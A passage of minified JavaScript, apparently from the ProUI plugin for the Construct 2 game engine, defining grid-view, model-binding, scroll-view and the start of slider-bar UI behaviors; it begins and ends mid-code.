if(2==t.op)this.build();else if(1==t.op){if(0<this.rows&&0<this.columns&&this.it_row==this.rows)return;this.add(this.value.length-1),this.nextRowColumn(),this.resize()}else-1==t.op?this.remove(t.idx):3==t.op?this.build():4==t.op&&this.edit(t.key,t.value);this.dpos.prev_x=this.inst.x,this.dpos.prev_y=this.inst.y,this.dpos.dx=0,this.dpos.dy=0,this.scrollView&&this.scrollView.postGridviewUpdate(),this.firstUpdateView&&this.runtime.trigger(cr.behaviors.aekiro_gridView.prototype.cnds.OnRender,this.inst),this.firstUpdateView=!0}},e.edit=function(t,e){var i,s,n=this.inst.proui_model.modelKey;if(t.slice(0,n.length+1)==n+"."){t=t.slice(n.length+1),n=t.split(".");if(1<n.length){i=n[0],s=t.slice(i.length+1);var r=this.items[i];if(r)for(var o=0,a=r.subs.length;o<a;o++){var h=r.subs[o];h.proui_bind&&h.proui_bind.bind_key==s&&h.proui_bind.setValue(e)}}}},e.clear=function(){for(var t=0,e=this.items.length;t<e;t++){this.runtime.DestroyInstance(this.items[t].parent);for(var i=0,s=this.items[t].subs.length;i<s;i++)this.runtime.DestroyInstance(this.items[t].subs[i])}this.items.length=0,this.it_column=0,this.it_row=0,this.inst.width=5,this.inst.height=5,this.inst.set_bbox_changed(),this.inst.update_bbox(),this.inst.x=this.initBboxLeft+(this.inst.x-this.inst.bbox.left),this.inst.y=this.initBboxTop+(this.inst.y-this.inst.bbox.top),this.inst.set_bbox_changed()},e.resize=function(){var t=Math.ceil(this.value.length/this.columns),e=Math.ceil(this.value.length/this.rows);this.rows<0?(e=this.columns,this.value.length<this.columns&&(e=this.value.length)):this.columns<0?(t=this.rows,this.value.length<this.rows&&(t=this.value.length)):(e=this.columns,t=this.rows),this.inst.update_bbox();var i=this.inst.bbox.top,s=this.inst.bbox.left;this.inst.width=this.template.item.width*e+this.vspace*(e-1)+2*this.HPadding,this.inst.height=this.template.item.height*t+this.hspace*(t-1)+2*this.VPadding,this.inst.set_bbox_changed(),this.inst.update_bbox(),this.inst.x=s+(this.inst.x-this.inst.bbox.left),this.inst.y=i+(this.inst.y-this.inst.bbox.top),this.inst.set_bbox_changed(),this.scrollView&&(this.scrollView.contentDpos.prev_x=this.inst.x,this.scrollView.contentDpos.prev_y=this.inst.y)},e.build=function(){if(0!=this.items.length&&this.value.length==this.items.length)for(var t=0;t<this.value.length;t++)this.mapData(t);else{this.clear();for(t=0;t<this.value.length&&(this.add(t),this.nextRowColumn());t++);this.resize()}},e.mapData=function(t){for(var e=this.items[t],i=0,s=e.subs.length;i<s;i++){var n,r=this.template.subs[i];(n=e.subs[i]).proui_bind&&g(this.value[t])&&(!(r=r.bindkey)||null!=(r=a(this.value[t],r))&&n.proui_bind.setValue(r))}},e.add=function(t){var e,i=this.inst.proui_model;this.inst.update_bbox(),this.runtime.extra.notRegister=!0,e=this.runtime.createInstance(this.template.item.type,this.inst.layer),this.template.item.type.plugin.acts.LoadFromJsonString.call(e,this.template.item.json),e.x=this.inst.bbox.left+this.template.item.offsetX+(this.vspace+e.width)*this.it_column+this.HPadding,e.y=this.inst.bbox.top+this.template.item.offsetY+(this.hspace+e.height)*this.it_row+this.VPadding,e.set_bbox_changed(),e.update_bbox(),this.items.push({parent:e,subs:[]}),e.proui_bind&&(e.proui_bind.index=t);for(var s=0,n=this.template.subs.length;s<n;s++){var r=this.template.subs[s],o=this.runtime.createInstance(r.type,this.inst.layer);r.type.plugin.acts.LoadFromJsonString.call(o,r.json),o.x=e.bbox.left+r.relX,o.y=e.bbox.top+r.relY,o.set_bbox_changed(),o.type.plugin.acts.SetEffect&&o.type.plugin.acts.SetEffect.call(o,9),o.proui_model&&(o.proui_model.modelUID=null,o.proui_model.modelKey=null),o._proui&&(o._proui.isValidModel=!1,null!=o._proui.compParent&&(o._proui.compParent=this)),this.items[t].subs.push(o),"radiogroup"!=o.uiType&&"discreteProgress"!=o.uiType&&"sliderbar"!=o.uiType||o._proui.clone(r.template),o.proui_bind&&g(this.value[t])&&((r=r.bindkey)&&("checkbox"!=o.uiType&&"radiogroup"!=o.uiType&&"sliderbar"!=o.uiType||(o.proui_bind.deepKey=i.modelKey+"."+t+"."+r,o.proui_bind.model=i.model),null!=(r=a(this.value[t],r))&&o.proui_bind.setValue(r)),o.proui_bind.index=t)}this.runtime.extra.notRegister=!1},e.nextRowColumn=function(){if(this.rows<0)this.it_column++,this.it_column==this.columns&&(this.it_column=0,this.it_row++);else if(this.columns<0)this.it_row++,this.it_row==this.rows&&(this.it_row=0,this.it_column++);else if(this.it_column++,this.it_column==this.columns&&(this.it_column=0,this.it_row++),this.it_row==this.rows)return!1;return!0},e.previousRowColumn=function(){if(this.rows<0)this.it_column--,this.it_column<0&&(this.it_column=this.columns-1,this.it_row--);else if(this.columns<0)this.it_row--,this.it_row<0&&(this.it_row=this.rows-1,this.it_column--);else if(this.it_column--,this.it_column<0&&(this.it_column=this.columns-1,this.it_row--),0==this.it_row)return!1;return!0},e.remove=function(t){for(var e,i,s,n,r,o,a,h,c=this.inst.proui_model,l=t,u=this.items.length;l<u;l++)if(a=this.items[l].parent,l==t){e=a.x,i=a.y,this.runtime.DestroyInstance(a);for(var p=0,d=this.items[l].subs.length;p<d;p++)this.runtime.DestroyInstance(this.items[l].subs[p])}else{s=a.x,n=a.y,a.x=e,a.y=i,e=s,i=n,a.set_bbox_changed(),a.update_bbox();for(p=0,d=this.items[l].subs.length;p<d;p++)o=this.template.subs[p],(r=this.items[l].subs[p]).x=a.bbox.left+o.relX,r.y=a.bbox.top+o.relY,r.set_bbox_changed(),r.proui_bind&&g(this.value[t])&&(r.proui_bind.index--,(o=o.bindkey)&&("checkbox"!=r.uiType&&"radiogroup"!=r.uiType&&"sliderbar"!=r.uiType||(r.proui_bind.deepKey=c.modelKey+"."+r.proui_bind.index+"."+o)))}this.items.splice(t,1),this.previousRowColumn(),this.resize(),0<this.rows&&0<this.columns&&(h=this.rows*this.columns,this.value.length>=h&&(this.add(h-1),this.nextRowColumn(),this.resize()))},e.setTemplateVisible=function(t){if(!this.isTemplateSet)for(var e,i=0,s=this.inst.layer.instances.length;i<s;i++)"discreteProgress"!=(e=this.inst.layer.instances[i]).uiType&&"sliderbar"!=e.uiType&&"progress"!=e.uiType&&"scrollView"!=e.uiType||e._proui.init()},e.tick=function(){var t;this.firstFrame&&(this.firstFrame=!1,this.setTemplateVisible(!1),(t=this.proui.tags[this.dialogUID])&&"dialog"==t.uiType&&t._proui&&(t._proui.outLayerChildren[this.inst.layer.name]||(t._proui.outLayerChildren[this.inst.layer.name]=[]),t._proui.outLayerChildren[this.inst.layer.name].push(this.inst)),this.dpos.prev_x=this.inst.x,this.dpos.prev_y=this.inst.y,this.dpos.dx=0,this.dpos.dy=0,this.updateFromModel(),this.firstUpdateView||this.updateView({op:2}))},e.updateChildren=function(){var t;if(isNaN(this.dpos.prev_x)&&(this.dpos.prev_x=this.inst.x,this.dpos.prev_y=this.inst.y),this.dpos.dx=this.inst.x-this.dpos.prev_x,this.dpos.dy=this.inst.y-this.dpos.prev_y,this.dpos.prev_x=this.inst.x,this.dpos.prev_y=this.inst.y,0!=this.dpos.dx||0!=this.dpos.dy)for(var e=0,i=this.inst.layer.instances.length;e<i;e++)!0!==(t=this.inst.layer.instances[e]).isSubComp&&"gridView"!=t.uiType&&"dialog"!=t.uiType&&"scrollView"!=t.uiType&&"scrollBar"!=t.uiType&&"slider"!=t.uiType&&(t.x+=this.dpos.dx,t.y+=this.dpos.dy,t.set_bbox_changed())},e.tick2=function(){this.updateChildren()},e.onDestroy=function(){},e.saveToJSON=function(){return{}},e.loadFromJSON=function(t){};var g=function(t){return!!t&&t.constructor===Object},i=function(t){return!!t&&t.constructor===Array},a=function(t,e){for(var i=(e=(e=e.replace(/\[(\w+)\]/g,".$1")).replace(/^\./,"")).split("."),s=0,n=i.length;s<n;++s){var r=i[s];if(!(r in t))return;t=t[r]}return t};function s(){}s.prototype.OnRender=function(){return!0},t.cnds=new s,t.acts=new function(){},t.exps=new function(){}}(),cr.behaviors.aekiro_modelB=function(t){this.runtime=t},function(){var t=cr.behaviors.aekiro_modelB.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){if(this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime,!cr.proui)throw new Error("ProUI Plugin not found. Please add it to the project.")};var e=t.Instance.prototype;function i(){}e.onCreate=function(){this.proui=cr.proui,this.modelUID=this.properties[0],this.modelKey=this.properties[1],this.model=this.proui.tags[this.modelUID],this.model=this.model&&"model"==this.model.uiType?this.model:null,this.firstFrame=!0,(this.inst.proui_model=this).model&&this.modelKey&&this.model.registerBehavior(this)},e.setModelValue=function(t,e){this.model&&this.modelKey&&cr.plugins_.aekiro_model.prototype.acts.SetValueByKeyString.call(this.model,this.modelKey,t,e)},e.setElementValue=function(t,e){var i=this.inst;i._proui&&i._proui._setValue&&i._proui._setValue(t,e)},e.getFromModel=function(){var t=null;return this.model&&this.modelKey&&(t=this.model.getValue(this.modelKey)),t},e.tick=function(){},e.onDestroy=function(){this.model&&this.model.unregisterBehavior(this),this.modelUID=0,this.modelKey="",this.model=null},e.saveToJSON=function(){},e.loadFromJSON=function(t){},t.cnds=new function(){},i.prototype.Reset=function(){this.model&&this.model.unregisterBehavior(this),this.modelUID="",this.modelKey="",this.model=null},t.acts=new i,t.exps=new function(){}}(),cr.behaviors.aekiro_scrollView=function(t){this.runtime=t},function(){var t=cr.behaviors.aekiro_scrollView.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){if(this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime,!cr.proui)throw new Error("ProUI Plugin not found. Please add it to the project.");this.behavior.isHooked||(cr.proui.HookMe(this.behavior,["touch","wheel"]),this.behavior.isHooked=!0)};var e=t.Instance.prototype;function i(){}e.onCreate=function(){this.proui=cr.proui,this.proui.isTypeValid(this.inst,[cr.plugins_.Sprite,cr.plugins_.NinePatch,cr.plugins_.TiledBg],"Pro UI: ScrollView behavior is only applicable to Sprite Or 9-patch objects."),this.scrolling=this.properties[0],this.isSwipeScroll=this.properties[1],this.isMouseScroll=this.properties[2],this.contentUID=this.properties[3],this.vSliderUID=this.properties[4],this.vScrollBarUID=this.properties[5],this.hSliderUID=this.properties[6],this.hScrollBarUID=this.properties[7],this.inertia=this.properties[8],this.movement=this.properties[9],this.dialogUID=this.properties[10],this.inertia||(this.movement=0),this.elasticF=1,this.movement&&(this.elasticF=.4),this.firstFrame=!0,this.uiType="scrollView",this.inst.uiType="scrollView",(this.inst._proui=this).dpos={},(this.proui.scrollViews["l"+this.inst.layer.index]=this).onTouchStarted=!1,this.isTouchMoving=!1,this.onSliderTouchStarted=!1,this.onvSliderTouchStarted=!1,this.onhSliderTouchStarted=!1,this.content=null,this.vSlider=null,this.vScrollBar=null,this.hSlider=null,this.hScrollBar=null,this.contentPrevWidth=0,this.contentPrevHeight=0,this.contentDpos={},this.isInit=!1,this.isContentGridView=!1,this.scroll={isEnabled:!1,prevTouchX:0,dx:0,prevTouchY:0,dy:0,scrollRatio:0,vScrolling:0==this.scrolling||2==this.scrolling,hScrolling:1==this.scrolling||2==this.scrolling,isSwipeScroll:this.isSwipeScroll,isMouseScroll:this.isMouseScroll,vSliderDy:0,hSliderDx:0,scrollToTargetY:null,scrollToTargetX:null,scrollToX:!1,scrollToY:!1,scrollToSmooth:.3}},e.scrollTo=function(t,e,i,s){this.inst.update_bbox(),this.content.update_bbox(),this.scroll.scrollToSmooth=s,this.scroll.scrollToTargetY=null,this.scroll.scrollToTargetX=null,this.scroll.scrollToX=!1,this.scroll.scrollToY=!1,this.onScrollToStarted=!1,0<=e&&this.scroll.vScrolling&&(s=(this.inst.bbox.top+this.inst.bbox.bottom)/2,e=i?(e=cr.clamp(e,0,1),this.content.bbox.top+e*this.content.height):this.content.bbox.top+e,this.scroll.scrollToTargetY=this.content.y+(s-e),this.scroll.scrollToY=!0,this.scroll.isEnabled=!0,this.onScrollToStarted=!0),0<=t&&this.scroll.hScrolling&&(e=(this.inst.bbox.left+this.inst.bbox.right)/2,t=i?(t=cr.clamp(t,0,1),this.content.bbox.left+t*this.content.width):this.content.bbox.left+t,this.scroll.scrollToTargetX=this.content.x+(e-t),this.scroll.scrollToX=!0,this.scroll.isEnabled=!0,this.onScrollToStarted=!0),this.content.set_bbox_changed()},e.OnWheel=function(t){this.isInteractible()&&this.scroll.isMouseScroll&&this.scroll.vScrolling&&this.isMouseOver()&&(this.scroll.scrollToX=!1,this.scroll.scrollToY=!1,this.scroll.isEnabled=!0,this.onWheelStarted=!0,t=0==t?-1:1,this.scroll.dy=.026*t*this.content.height)},e.OnAnyTouchStart=function(){this.vSlider&&this.isInTouch(this.vSlider)&&this.scroll.vScrolling&&(this.OnSliderTouchStart(),this.onvSliderTouchStarted=!0),this.hSlider&&this.isInTouch(this.hSlider)&&this.scroll.hScrolling&&(this.OnSliderTouchStart(),this.onhSliderTouchStarted=!0)},e.isInteractible=function(){for(var t=!0,e=0,i=this.proui.currentDialogs.length;e<i;e++)if(this.inst.layer.index<this.proui.currentDialogs[e].inst.layer.index)return t=!1;for(var s,n=this.runtime.running_layout.layers,e=this.inst.layer.index+1,i=n.length;e<i;e++)if(s=this.proui.scrollViews["l"+e],s&&(s.inst.update_bbox(),s.inst.contains_pt(this.proui.X(s.inst.layer.index),this.proui.Y(s.inst.layer.index))||s.inst.contains_pt(this.proui.CursorX(s.inst.layer.index),this.proui.CursorY(s.inst.layer.index)))){t=!1;break}return t},e.OnTouchStart=function(){this.isInteractible()&&(this.onTouchStarted=!0,this.scroll.vScrolling&&(this.scroll.prevTouchY=this.proui.Y(this.inst.layer.index),this.scroll.dy=0,this.scroll.isEnabled=!0,this.scroll.scrollToX=!1,this.scroll.scrollToY=!1),this.scroll.hScrolling&&(this.scroll.prevTouchX=this.proui.X(this.inst.layer.index),this.scroll.dx=0,this.scroll.isEnabled=!0,this.scroll.scrollToX=!1,this.scroll.scrollToY=!1))},e.OnTouchMove=function(){this.isTouchMoving=!0},e.OnAnyTouchEnd=function(t,e){this.onTouchStarted&&this.OnTouchEnd(t,e),this.onTouchStarted=!1,this.onSliderTouchStarted=!1,this.onvSliderTouchStarted=!1,this.onhSliderTouchStarted=!1},e.OnTouchEnd=function(t,e){this.isTouchMoving=!1},e.OnSliderTouchStart=function(){this.scroll.prevTouchY=this.proui.Y(this.inst.layer.index),this.scroll.prevTouchX=this.proui.X(this.inst.layer.index),this.scroll.dy=0,this.scroll.dx=0,this.scroll.vSliderDy=0,this.scroll.hSliderDx=0,this.onSliderTouchStarted=!0,this.scroll.isEnabled=!0,this.scroll.scrollToX=!1,this.scroll.scrollToY=!1},e.isMouseOver=function(){var t=this.proui.CursorX(this.inst.layer.index),e=this.proui.CursorY(this.inst.layer.index);return this.inst.update_bbox(),this.inst.contains_pt(t,e)},e.isInTouch=function(t){var e=this.proui.X(this.inst.layer.index),i=this.proui.Y(this.inst.layer.index);return t.update_bbox(),t.contains_pt(e,i)},e.boundSlider=function(t){var e;"v"==t&&this.vSlider&&this.vScrollBar&&(this.inst.update_bbox(),this.content.update_bbox(),this.vScrollBar.update_bbox(),this.vSlider.update_bbox(),e=this.vScrollBar.bbox.top+(this.vSlider.y-this.vSlider.bbox.top)+(this.vScrollBar.height-this.vSlider.height)*((this.content.bbox.top-this.inst.bbox.top)/(this.inst.height-this.content.height)),this.vSlider.y=cr.clamp(e,this.vScrollBar.bbox.top+(this.vSlider.y-this.vSlider.bbox.top),this.vScrollBar.bbox.bottom-(this.vSlider.bbox.bottom-this.vSlider.y)),this.vSlider.set_bbox_changed()),"h"==t&&this.hSlider&&this.hScrollBar&&(this.inst.update_bbox(),this.content.update_bbox(),this.hScrollBar.update_bbox(),this.hSlider.update_bbox(),t=this.hScrollBar.bbox.left+(this.hSlider.x-this.hSlider.bbox.left)+(this.hScrollBar.width-this.hSlider.width)*((this.content.bbox.left-this.inst.bbox.left)/(this.inst.width-this.content.width)),this.hSlider.x=cr.clamp(t,this.hScrollBar.bbox.left+(this.hSlider.x-this.hSlider.bbox.left),this.hScrollBar.bbox.right-(this.hSlider.bbox.right-this.hSlider.x)),this.hSlider.set_bbox_changed())},e.postGridviewUpdate=function(){for(var t=[this.vScrollBar,this.vSlider,this.hScrollBar,this.hSlider],e=0,i=t.length;e<i;e++)t[e]&&t[e].type.plugin.acts.MoveToTop.call(t[e])},e.init=function(){if(!this.isInit){if(this.vSliderUID&&(this.vSlider=this.proui.tags[this.vSliderUID],this.vSlider?(this.proui.isTypeValid(this.vSlider,[cr.plugins_.Sprite,cr.plugins_.NinePatch],"ProUI-ScrollView: The vertical slider can only be a Sprite Or 9-patch object."),this.vSlider.uiType="slider"):console.error("ProUI-ScrollView %d : Vertical slider not found",this.inst.uid)),this.vScrollBarUID&&(this.vScrollBar=this.proui.tags[this.vScrollBarUID],this.vScrollBar?(this.proui.isTypeValid(this.vScrollBar,[cr.plugins_.Sprite,cr.plugins_.NinePatch],"ProUI-ScrollView: The vertical scrollbar can only be a Sprite Or 9-patch object."),this.vScrollBar.uiType="scrollBar"):console.error("ProUI-ScrollView %d : Vertical scrollbar not found",this.inst.uid)),this.hSliderUID&&(this.hSlider=this.proui.tags[this.hSliderUID],this.hSlider?(this.proui.isTypeValid(this.hSlider,[cr.plugins_.Sprite,cr.plugins_.NinePatch],"ProUI-ScrollView: The horizontal slider can only be a Sprite Or 9-patch object."),this.hSlider.uiType="slider"):console.error("ProUI-ScrollView %d : Horizontal slider not found",this.inst.uid)),this.hScrollBarUID&&(this.hScrollBar=this.proui.tags[this.hScrollBarUID],this.hScrollBar?(this.proui.isTypeValid(this.hScrollBar,[cr.plugins_.Sprite,cr.plugins_.NinePatch],"ProUI-ScrollView: The horizontal scrollbar can only be a Sprite Or 9-patch object."),this.hScrollBar.uiType="scrollBar"):console.error("ProUI-ScrollView %d : Horizontal scrollbar not found",this.inst.uid)),this.content=this.proui.tags[this.contentUID],!this.content)throw new Error("ProUI-ScrollView: Content not found, please check the content tag");var t;this.proui.isTypeValid(this.content,[cr.plugins_.Sprite,cr.plugins_.NinePatch,cr.plugins_.TiledBg],"ProUI-ScrollView: The content of the scrollView can only be a Sprite Or 9-patch object."),"gridView"==this.content.uiType&&(this.isContentGridView=!0,this.content._proui.scrollView=this),this.content.height<=this.inst.height&&(this.scroll.vScrolling=!1),this.content.width<=this.inst.width&&(this.scroll.hScrolling=!1),this.contentPrevHeight=this.content.height,this.contentPrevWidth=this.content.width,this.contentDpos.prev_x=this.content.x,this.contentDpos.prev_y=this.content.y,this.contentDpos.dx=0,this.contentDpos.dy=0,this.inst.update_bbox(),this.content.update_bbox(),this.content.x=this.inst.bbox.left+(this.content.x-this.content.bbox.left),this.content.y=this.inst.bbox.top+(this.content.y-this.content.bbox.top),this.content.set_bbox_changed(),this.hSlider&&this.hScrollBar&&(this.hSlider.update_bbox(),this.hScrollBar.update_bbox(),this.hSlider.x=this.hScrollBar.bbox.left+(this.hSlider.x-this.hSlider.bbox.left),this.hSlider.set_bbox_changed(),this.hScrollBar.type.plugin.acts.MoveToTop.call(this.hScrollBar),this.hSlider.type.plugin.acts.MoveToTop.call(this.hSlider)),this.vSlider&&this.vScrollBar&&(this.vSlider.update_bbox(),this.vScrollBar.update_bbox(),this.vSlider.y=this.vScrollBar.bbox.top+(this.vSlider.y-this.vSlider.bbox.top),this.vSlider.set_bbox_changed(),this.vScrollBar.type.plugin.acts.MoveToTop.call(this.vScrollBar),this.vSlider.type.plugin.acts.MoveToTop.call(this.vSlider)),cr.system_object.prototype.acts.SetLayerForceOwnTexture.call(this.runtime.system,this.inst.layer,!0);for(var e=0,i=this.inst.layer.instances.length;e<i;e++)(t=this.inst.layer.instances[e])&&t!=this.inst&&"dialog"!=t.uiType&&"scrollBar"!=t.uiType&&"slider"!=t.uiType&&t.type.plugin.acts.SetEffect&&t.type.plugin.acts.SetEffect.call(t,9);this.isInit=!0;var s=this.proui.tags[this.dialogUID];s&&"dialog"==s.uiType&&s._proui&&(s._proui.outLayerChildren[this.inst.layer.name]||(s._proui.outLayerChildren[this.inst.layer.name]=[]),s._proui.outLayerChildren[this.inst.layer.name].push(this.inst),s._proui.isOpen||cr.system_object.prototype.acts.SetLayerVisible.call(this.runtime.system,this.inst.layer,!1))}},e.tick=function(){var t,e,i,s;this.firstFrame&&(this.firstFrame=!1,this.prevSelfLayerVisible=this.inst.layer.visible,this.init(),this.dpos.prev_x=this.inst.x,this.dpos.prev_y=this.inst.y,this.dpos.dx=0,this.dpos.dy=0),this.content&&(this.contentDpos.dx=this.content.x-this.contentDpos.prev_x,this.contentDpos.dy=this.content.y-this.contentDpos.prev_y,this.contentDpos.prev_x=this.content.x,this.contentDpos.prev_y=this.content.y,(e=this.inst.layer.visible)!=this.prevSelfLayerVisible&&(this.prevSelfLayerVisible=this.inst.layer.visible,cr.system_object.prototype.acts.SetLayerForceOwnTexture.call(this.runtime.system,this.inst.layer,e)),this.contentPrevHeight!=this.content.height&&(this.inst.update_bbox(),this.content.update_bbox(),this.content.height<=this.inst.height?(this.content.y=this.inst.bbox.top+(this.content.y-this.content.bbox.top),this.scroll.vScrolling=!1):(this.content.y=cr.clamp(this.content.y,this.inst.bbox.bottom-(this.content.bbox.bottom-this.content.y),this.inst.bbox.top+(this.content.y-this.content.bbox.top)),0!=this.scrolling&&2!=this.scrolling||(this.scroll.vScrolling=!0)),this.content.set_bbox_changed(),this.boundSlider("v"),this.contentPrevHeight=this.content.height),this.contentPrevWidth!=this.content.width&&(this.inst.update_bbox(),this.content.update_bbox(),this.content.width<=this.inst.width?(this.content.x=this.inst.bbox.left+(this.content.x-this.content.bbox.left),this.scroll.hScrolling=!1):(this.content.x=cr.clamp(this.content.x,this.inst.bbox.right-(this.content.bbox.right-this.content.x),this.inst.bbox.left+(this.content.x-this.content.bbox.left)),1!=this.scrolling&&2!=this.scrolling||(this.scroll.hScrolling=!0)),this.content.set_bbox_changed(),this.boundSlider("h"),this.contentPrevWidth=this.content.width),this.scroll.isEnabled&&(this.onvSliderTouchStarted&&this.scroll.vScrolling&&(this.scroll.vSliderDy=this.proui.Y(this.inst.layer.index)-this.scroll.prevTouchY,this.scroll.prevTouchY=this.proui.Y(this.inst.layer.index),i=this.vSlider.y+this.scroll.vSliderDy,this.vSlider.update_bbox(),this.vScrollBar.update_bbox(),this.vSlider.y=cr.clamp(i,this.vScrollBar.bbox.top+(this.vSlider.y-this.vSlider.bbox.top),this.vScrollBar.bbox.bottom-(this.vSlider.bbox.bottom-this.vSlider.y)),this.vSlider.set_bbox_changed(),this.vSlider.update_bbox(),this.inst.update_bbox(),this.content.update_bbox(),this.content.y=this.inst.bbox.top+(this.content.y-this.content.bbox.top)-(this.vSlider.bbox.top-this.vScrollBar.bbox.top)/(this.vScrollBar.height-this.vSlider.height)*(this.content.height-this.inst.height),this.content.set_bbox_changed()),this.onhSliderTouchStarted&&this.scroll.hScrolling&&(this.scroll.hSliderDx=this.proui.X(this.inst.layer.index)-this.scroll.prevTouchX,this.scroll.prevTouchX=this.proui.X(this.inst.layer.index),s=this.hSlider.x+this.scroll.hSliderDx,this.hSlider.update_bbox(),this.hScrollBar.update_bbox(),this.hSlider.x=cr.clamp(s,this.hScrollBar.bbox.left+(this.hSlider.x-this.hSlider.bbox.left),this.hScrollBar.bbox.right-(this.hSlider.bbox.right-this.hSlider.x)),this.hSlider.set_bbox_changed(),this.hSlider.update_bbox(),this.inst.update_bbox(),this.content.update_bbox(),this.content.x=this.inst.bbox.left+(this.content.x-this.content.bbox.left)-(this.hSlider.bbox.left-this.hScrollBar.bbox.left)/(this.hScrollBar.width-this.hSlider.width)*(this.content.width-this.inst.width),this.content.set_bbox_changed()),this.scroll.isSwipeScroll&&this.isInTouch(this.inst)&&!this.onSliderTouchStarted&&this.onTouchStarted&&(this.scroll.vScrolling&&(this.scroll.dy=this.proui.Y(this.inst.layer.index)-this.scroll.prevTouchY+(this.runtime.tickcount%2==1?.2:-.2),this.scroll.prevTouchY=this.proui.Y(this.inst.layer.index)),this.scroll.hScrolling&&(this.scroll.dx=this.proui.X(this.inst.layer.index)-this.scroll.prevTouchX,this.scroll.prevTouchX=this.proui.X(this.inst.layer.index))),this.scroll.vScrolling&&!this.onSliderTouchStarted&&(this.scroll.scrollToY?null!=this.scroll.scrollToTargetY&&(this.content.y=cr.lerp(this.content.y,this.scroll.scrollToTargetY,this.scroll.scrollToSmooth),Math.abs(this.content.y-this.scroll.scrollToTargetY)<5&&(this.content.y=this.scroll.scrollToTargetY,this.scroll.scrollToY=!1)):this.content.y=cr.lerp(this.content.y,this.content.y+this.scroll.dy,.7),this.content.set_bbox_changed(),this.inertia?this.scroll.dy=14/15*this.scroll.dy:this.scroll.dy=0,this.boundSlider("v")),this.scroll.hScrolling&&!this.onSliderTouchStarted&&(this.scroll.scrollToX?null!=this.scroll.scrollToTargetX&&(this.content.x=cr.lerp(this.content.x,this.scroll.scrollToTargetX,this.scroll.scrollToSmooth),Math.abs(this.content.x-this.scroll.scrollToTargetX)<5&&(this.content.x=this.scroll.scrollToTargetX,this.scroll.scrollToX=!1)):this.content.x=cr.lerp(this.content.x,this.content.x+this.scroll.dx,.7),this.content.set_bbox_changed(),this.inertia?this.scroll.dx=14/15*this.scroll.dx:this.scroll.dx=0,this.boundSlider("h")),this.onSliderTouchStarted||(this.inst.update_bbox(),this.content.update_bbox(),s=i=e=t=0,this.scroll.vScrolling&&(t=this.content.bbox.top-this.inst.bbox.top,e=this.inst.bbox.bottom-this.content.bbox.bottom,(0<t||0<e)&&(this.scroll.scrollToY?(this.content.y=cr.clamp(this.content.y,this.content.y+e,this.content.y-t),this.scroll.scrollToTargetY=this.content.y,this.scroll.scrollToY=!1):this.content.y=cr.clamp(this.content.y,cr.lerp(this.content.y,this.content.y+e,this.elasticF),cr.lerp(this.content.y,this.content.y-t,this.elasticF))),this.content.set_bbox_changed()),this.scroll.hScrolling&&(i=this.inst.bbox.right-this.content.bbox.right,s=this.content.bbox.left-this.inst.bbox.left,(0<i||0<s)&&(this.scroll.scrollToX?(this.content.x=cr.clamp(this.content.x,this.content.x+i,this.content.x-s),this.scroll.scrollToTargetX=this.content.x,this.scroll.scrollToX=!1):this.content.x=cr.clamp(this.content.x,cr.lerp(this.content.x,this.content.x+i,this.elasticF),cr.lerp(this.content.x,this.content.x-s,this.elasticF))),this.content.set_bbox_changed()),!this.inertia&&this.onWheelStarted&&(this.scroll.isEnabled=!1,this.onWheelStarted=!1),!this.onScrollToStarted||this.scroll.scrollToX||this.scroll.scrollToY||(this.scroll.isEnabled=!1,this.onScrollToStarted=!1),this.inertia&&Math.abs(this.scroll.dx)<.1&&Math.abs(this.scroll.dy)<.1&&!this.scroll.scrollToX&&!this.scroll.scrollToY&&(this.scroll.isEnabled=!1,console.log("Scroll disabled")))))},e.updateContentChildren=function(){var t;if(this.content&&(0!=this.contentDpos.dx||0!=this.contentDpos.dy))for(var e=0,i=this.inst.layer.instances.length;e<i;e++)(t=this.inst.layer.instances[e])&&t!=this.content&&!0!==t.isSubComp&&"dialog"!=t.uiType&&"scrollView"!=t.uiType&&"scrollBar"!=t.uiType&&"slider"!=t.uiType&&(t.x+=this.contentDpos.dx,t.y+=this.contentDpos.dy,t.set_bbox_changed())},e.updateChildren=function(){isNaN(this.dpos.prev_x)&&(this.dpos.prev_x=this.inst.x,this.dpos.prev_y=this.inst.y),this.dpos.dx=this.inst.x-this.dpos.prev_x,this.dpos.dy=this.inst.y-this.dpos.prev_y,this.dpos.prev_x=this.inst.x,this.dpos.prev_y=this.inst.y;var t,e=[this.content,this.vScrollBar,this.vSlider,this.hScrollBar,this.hSlider];if(0!=this.dpos.dx||0!=this.dpos.dy)for(var i=0,s=e.length;i<s;i++)(t=e[i])&&(t.x+=this.dpos.dx,t.y+=this.dpos.dy,t.set_bbox_changed())},e.tick2=function(){this.isContentGridView||this.updateContentChildren(),this.updateChildren()},e.onDestroy=function(){this.proui.scrollViews["l"+this.inst.layer.index]=null},e.saveToJSON=function(){return{}},e.loadFromJSON=function(t){},t.cnds=new function(){},i.prototype.ScrollTo=function(t,e,i,s){this.scrollTo(t,e,i,s)},t.acts=new i,t.exps=new function(){}}(),cr.behaviors.aekiro_sliderbar=function(t){this.runtime=t},function(){var t=cr.behaviors.aekiro_sliderbar.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){if(this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime,!cr.proui)throw new Error("ProUI Plugin not found. Please add it to the project.");this.behavior.isHooked||(cr.proui.HookMe(this.behavior,["touch"]),this.behavior.isHooked=!0)};var e=t.Instance.prototype;function i(){}function s(){}function n(){}e.onCreate=function(){this.proui=cr.proui,this.proui.isTypeValid(this.inst,[cr.plugins_.Sprite,cr.plugins_.NinePatch],"Pro UI: SliderBar behavior is only applicable to Sprite Or 9-patch 